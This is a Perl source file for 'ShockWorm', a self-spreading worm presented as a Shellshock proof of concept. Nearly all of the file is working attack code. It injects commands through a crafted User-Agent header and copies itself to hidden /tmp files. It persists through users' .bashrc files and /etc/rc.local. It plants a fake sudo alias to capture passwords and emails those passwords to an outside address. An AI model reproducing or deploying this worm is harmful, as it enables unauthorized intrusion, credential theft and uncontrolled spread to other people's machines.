#!/usr/bin/perl
#######################################################################
#       .__                   __                                      #
#  _____|  |__   ____   ____ |  | ____  _  _____________  _____       #
# /  ___/  |  \ /  _ \_/ ___\|  |/ /\ \/ \/ /  _ \_  __ \/     \      #
# \___ \|   Y  (  <_> )  \___|    <  \     (  <_> )  | \/  Y Y  \     #
#/____  >___|  /\____/ \___  >__|_ \  \/\_/ \____/|__|  |__|_|  /     #
#     \/     \/            \/     \/                          \/      #
#   																  #
#######################################################################
#######################################################################
#   ___.                           __  .__  .__        __             #
#   \_ |__ ___.__.   _____ _____ _/  |_|  | |__| ____ |  | __         #
#    | __ <   |  |  /     \\__  \\   __\  | |  |/    \|  |/ /         #
#    | \_\ \___  | |  Y Y  \/ __ \|  | |  |_|  |   |  \    <          #
#    |___  / ____| |__|_|  (____  /__| |____/__|___|  /__|_ \         #
#        \/\/            \/     \/                  \/     \/         #
#######################################################################
#######################################################################
# ShockWorm By Matlink. Written in Perl. PoC for the shellshock vuln
# Use this carefully. Only test on your servers ! I'm not responsible 
# for illegal uses !
# Common CGI paths can be found @ 
# https://docs.google.com/document/d/1vN2QOG2OZIAHGXDmd5wB8FPi-Hin2GaIlWRJ0RYkTbA
#
#
use strict;
use warnings;
use User::grent;
use IO::Socket::INET;

# Our local IP address not to infect ourselves
my $local_ip_address = get_local_ip_address();

my $public_ip_address = get_public_ip_address();
# Version Number in case of update
my $versionNo	= 0.1;
# The path to the vulnerable script on the remote machine
my $pathToCgi 	= "/cgi-bin/shock.cgi";
# The commands to run when trying to inject the worm in the remote machine
my @payloads;
# The worm filename
my $filename	= $0;
# The base64 version of this worm to escape any non-ASCII character
my $base64		= `base64 -w 0 $filename`;
# We need to split the base64 version because it's too long for User Agent value
my $split		= 8000;
my $base64_start = substr $base64, 0, $split;
my $base64_end	=  substr $base64, $split;	
# The folder where the worm will live on the remote machine
my $folderPath  = "/tmp/.ssh-mOTc45gfXwPj";
# File where th ebase64 version of this worm will be written in
my $destNameTmp = "$folderPath/agent.1336";
# File where the plain text version will be written in
my $destName	= "$folderPath/agent.1337";
my $errorRedir  = "2> /dev/null";
my $allRedir	= "&> /dev/null";
# File to avoid over infection
my $isInfectedF = "$folderPath/agent.alive";
# File where the captured passwords will be written in
my $sudoFile	= "$folderPath/agent.1338";
# List of all passwords
my @sudoPasswords;
# Alias for bashrc to capture passwords of sudo command
my $sudoAlias	= "capture(){
	echo -n \"[sudo] password for \$USER: \"\ && 
	read -rs password && 
	echo \"\$password:\$(whoami)\" >> $sudoFile && 
	echo \"\$password\" | /usr/bin/sudo -S \"\$@\"
}
alias sudo=capture;
";
# The IPs of the target machines
my @targetIPS;
# All the users of the system
my @names = getUsers();
# File which is executed as root on every boot 
my $rc_local = "/etc/rc.local";
# In this file, we will change TMPTIME value to avoid /tmp to be cleaned at every boot
my $rcS = "/etc/default/rcS";


#### Functions declaration ####
sub targetIPSDefine {
	push(@targetIPS, "192.168.1.24");
}

sub payloadsDefine {
	# Create the destination folder
	push(@payloads, "/bin/mkdir -p $folderPath");
	# Write the base64 version of the worm, first part
	push(@payloads, "echo $base64_start  > $destNameTmp $errorRedir");
	# Write the base64 version of the worm, second part
	push(@payloads, "echo $base64_end  >> $destNameTmp $errorRedir");
	# Decode the base64
	push(@payloads, "/usr/bin/base64 -d $destNameTmp > $destName $errorRedir");
	# Make the worm executable
	push(@payloads, "/bin/chmod +x $destName $allRedir");
	# Make the folder world-writtable
	push(@payloads, "/bin/chmod o+w $folderPath");
	# Launch the worm
	push(@payloads, "$destName $allRedir \&");
}

sub inject {
	# For each target
	foreach my $targetIP (@targetIPS){
		# Try to inject worm only if the remote address in not ourself
		if($targetIP ne $local_ip_address){
			# Send all payloads
			foreach (@payloads){
				# Payload is executed with UserAgent vulnerability due to shellshock
				system("wget -T 5 -t 1 -o /dev/null -O /dev/null http://$targetIP$pathToCgi --ignore-length --header=\"User-Agent: () { :;}; $_ $errorRedir \"");
			}
		}
	}
}

# Gather all the users of the system
sub getUsers {
	my @names;
	while(my $group = getgrent){
		push(@names, $group->name);
	}
	return @names;
}

# make the worm be launched with user permissions at user connection
sub persist {
	# Avoid over infection
	system("echo 1 >> $isInfectedF $errorRedir");
	# Avoid to write more than once in the bashrc file
	my $persistantCall = "$destName $errorRedir &";
	# for each user
	foreach my $user (@names){
		# Try to write in his/her bashrc
		if(-e "/home/$user/.bashrc" && open(my $bashrc, '<', "/home/$user/.bashrc")){
			my $present = 0;
			my $line = "here";
			chomp $destName;
			while(my $line = <$bashrc>){
				chomp $line;
				$present = ($line eq $persistantCall);
				if($present){
					last;
				}
			}		
			close($bashrc);
			open(my $bashrc, '>>', "/home/$user/.bashrc");	
			print $bashrc $sudoAlias if not $present;
			close $bashrc;
			system("echo '$destName $errorRedir &' >> /home/$user/.bashrc $errorRedir") if not $present;
		}
	}
}

# Creates a socket, to get local IP address to avoid over-infection (not to target ourselves)
sub get_local_ip_address {
    my $socket = IO::Socket::INET->new(
        Proto       => 'udp',
        PeerAddr    => '198.41.0.4', # a.root-servers.net
        PeerPort    => '53', # DNS
    );

    # A side-effect of making a socket connection is that our IP address
    # is available from the 'sockhost' method
    my $local_ip_address = $socket->sockhost;
    return $local_ip_address;
}

# Same as before, but in order to get the public IP address (both v4 and v6)
sub get_public_ip_address {
    my $ipv4 = `wget -qO- http://tnx.nl/ip -4`;
    my $ipv6 = `wget -qO- http://tnx.nl/ip -6`;
    return "$ipv4-$ipv6";
}

# Retrieve the sudo password from the file if it has been put in it
sub get_sudo_password {
	if(-e $sudoFile && open(my $sudoBuffer, '<', $sudoFile)){
		@sudoPasswords=();
		while(my $line = <$sudoBuffer>){
			(my $pass,my $login) = split(':', $line);
			chomp $pass;
			push(@sudoPasswords, $pass);
		}
		close($sudoBuffer);
	}
}

# Write a call to the worm in the /etc/rc.local file if a sudo password has been captured
sub sudo_persist {
	my $persistantCall = "$destName $errorRedir &";
	my $present = 0;
	my $line = "here";
	# Check if the call is not already present in the file
	open(my $rc_local_buff, '<', "$rc_local");
	while(my $line = <$rc_local_buff>){
		chomp $line;
		$present = ($line eq $persistantCall);
		if($present){
			last;
		}
	}		
	close($rc_local_buff);
	# If the line of the call is not present, then add it
	if(not $present and @sudoPasswords){
		my $tmp_file = ".tmp.tmp";
		foreach my $password (@sudoPasswords){
			# Set /tmp cleaning to never, otherwise /tmp is emptied at every boot
			# Write our worm call in the /etc/rc.local file, in the second line using a temporary file
			system("echo '$password' | sudo -S sh -c \"
				sed -i '/TMPTIME=/c\\TMPTIME=-1' $rcS;
				head -n1 $rc_local > $tmp_file && 
				echo '$destName $errorRedir &' >> $tmp_file &&
				tail -n +2 $rc_local >> $tmp_file && 
				cat $tmp_file > $rc_local && 
				rm -f $tmp_file
				\"");
		}
	}
}

# If worm is already running, exit this instance
sub check_if_running {
	my $number_running = `ps -e | grep agent\\.1337 | wc -l`;
	if ($number_running>1){
		exit;
	}	
}

# Send a mail to the given email address, giving captured passwords
sub send_mail {
	if(open my $fh, '<', $sudoFile){
		my $to = 'matlink@matlink.fr';
		my $from = "worm\@$public_ip_address";
		my $subject = 'worm report';
		my $message = do { local $/; <$fh> };
		 
		open(MAIL, "|/usr/sbin/sendmail -t");
		 
		# Email Header
		print MAIL "To: $to\n";
		print MAIL "From: $from\n";
		print MAIL "Subject: $subject\n\n";
		# Email Body
		print MAIL $message;

		close(MAIL);
	}
}

##### Main program #####
# Exit if another instance is running
check_if_running;
# Add targets to array
targetIPSDefine;
# Add payloads to array
payloadsDefine;
# Try to copy this worm into remote machines
inject;
# Avoid to run bad things to personnal computer. Change panoramix by the result of "hostname" command on your workstation
if(`/bin/hostname` ne "panoramix\n"){
	while(1){
		# write call to worm to .bashrc of all users if possible
		persist;
		# try to retrieve sudo passwords from dump file
		get_sudo_password;
		# if any password has been captured, write call to worm into /etc/rc.local to get root permissions at reboot
		sudo_persist;
		# sendmail if passwords have been captured
		send_mail;
		sleep 15;
	}
}
exit 0;